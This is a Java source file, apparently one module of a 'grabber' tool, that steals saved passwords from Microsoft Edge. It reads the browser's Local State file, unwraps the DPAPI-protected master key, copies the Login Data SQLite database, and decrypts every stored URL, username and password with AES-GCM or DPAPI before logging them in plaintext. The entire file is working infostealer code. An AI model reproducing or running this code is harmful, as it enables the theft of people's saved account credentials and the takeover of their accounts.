package ninja.maki.grabber.edge;

import com.sun.jna.platform.win32.Crypt32Util;
import ninja.maki.utils.Logger;
import ninja.maki.utils.SystemUtil;
import org.apache.commons.codec.binary.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Arrays;

public class EdgeLogin {
    public static void grab() {
        Logger.log("Edge Login", Logger.Type.INFO);
        String loginTemp = System.getProperty("java.io.tmpdir") + "edgelogindata.tmp";
        String loginPath = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
        File loginTempFile = new File(loginTemp);
        try {
            loginTempFile = File.createTempFile("edgelogindata", ".tmp");
            loginTemp = loginTempFile.getAbsolutePath();
        }catch (IOException e){
            Logger.log("Failed to create temp file.", Logger.Type.ERROR);
        }
        File loginPathFile = new File(loginPath);
        if(loginPathFile.exists()) {
            try {
                String loginState = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
                File loginStateFile = new File(loginState);
                StringBuilder cryptMasterKey = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new FileReader(loginStateFile))) {
                    String tempString;
                    while ((tempString = reader.readLine()) != null) {
                        cryptMasterKey.append(tempString);
                    }
                } catch (IOException e) {
                    Logger.log("Failed to read file \"" + loginState + "\".", Logger.Type.ERROR);
                }
                cryptMasterKey = new StringBuilder(SystemUtil.getSubString(cryptMasterKey.toString(), "\"encrypted_key\":\"", "\""));
                byte[] masterKey = Base64.decodeBase64(cryptMasterKey.toString());
                if (new String(masterKey).startsWith("DPAPI")) {
                    Logger.log("Get Encrypted Key.", Logger.Type.INFO);
                } else {
                    throw new Exception("Failed to get Encrypted Key.");
                }
                masterKey = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKey, "DPAPI".length(), masterKey.length));
                if (masterKey.length != 256 / 8) throw new Exception("Failed to decrypt key.");
                try {
                    SystemUtil.copyFile(loginPathFile, loginTempFile);
                    Logger.log("Copy \"" + loginPath + "\" to \"" + loginTemp + "\".", Logger.Type.INFO);
                } catch (IOException e) {
                    Logger.log("Failed to copy \"" + loginPath + "\" to \"" + loginTemp + "\".", Logger.Type.ERROR);
                }
                Connection connection;
                Statement statement;
                try {
                    Class.forName("org.sqlite.JDBC");
                    connection = DriverManager.getConnection("jdbc:sqlite:" + loginTemp);
                    connection.setAutoCommit(false);
                    Logger.log("Connect database \"" + loginTemp + "\".", Logger.Type.INFO);
                    statement = connection.createStatement();
                    ResultSet resultSet = statement.executeQuery("SELECT origin_url, username_value, password_value FROM logins");
                    Logger.log("", Logger.Type.INFO);
                    Logger.log("==================================================================", Logger.Type.INFO);
                    while (resultSet.next()) {
                        String url = resultSet.getString("origin_url");
                        String username = resultSet.getString("username_value");
                        String cryptPassword = resultSet.getString("password_value");
                        InputStream inputStream = resultSet.getBinaryStream("password_value");
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                        int ch;
                        while ((ch = inputStream.read()) != -1) {
                            byteArrayOutputStream.write(ch);
                        }
                        byte[] passwordByte = byteArrayOutputStream.toByteArray();
                        byteArrayOutputStream.close();
                        String password;
                        if (cryptPassword.startsWith("v10")) {
                            byte[] nonce = Arrays.copyOfRange(passwordByte, "v10".length(), "v10".length() + 96 / 8);
                            passwordByte = Arrays.copyOfRange(passwordByte, "v10".length() + 96 / 8, passwordByte.length);
                            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                            SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
                            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(16 * 8, nonce);
                            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
                            password = new String(cipher.doFinal(passwordByte));
                        } else {
                            password = new String(Crypt32Util.cryptUnprotectData(passwordByte), StandardCharsets.UTF_8);
                        }
                        Logger.log("", Logger.Type.INFO);
                        Logger.log("URL -> " + url, Logger.Type.INFO);
                        Logger.log("Username -> " + username, Logger.Type.INFO);
                        Logger.log("Password -> " + password, Logger.Type.INFO);
                    }
                    Logger.log("", Logger.Type.INFO);
                    Logger.log("==================================================================", Logger.Type.INFO);
                    resultSet.close();
                    statement.close();
                    connection.close();
                } catch (Exception e) {
                    Logger.log("Failed to get info.", Logger.Type.ERROR);
                }
            }catch (Exception e) {
                Logger.log(e.getMessage(), Logger.Type.ERROR);
            }
        }else {
            Logger.log("\"" + loginPath + "\" is not founded.", Logger.Type.ERROR);
        }
        Logger.log("", Logger.Type.INFO);
        if(loginTempFile.exists()) {
            if(!loginTempFile.delete()) {
                Logger.log("Failed to delete \"" + loginTemp + "\".", Logger.Type.ERROR);
            }
        }
    }
}
